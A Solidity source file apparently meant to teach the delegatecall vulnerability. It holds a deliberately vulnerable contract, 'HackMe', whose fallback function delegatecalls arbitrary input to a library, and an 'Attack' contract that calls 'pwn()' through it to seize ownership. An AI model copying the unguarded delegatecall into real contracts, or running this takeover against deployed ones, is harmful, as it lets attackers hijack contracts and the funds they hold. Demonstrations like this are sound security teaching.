// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);   
    }

    fallback() external payable {
        (bool success, ) =  address(lib).delegatecall(msg.data);
        require(success, "call failed");
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe){
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
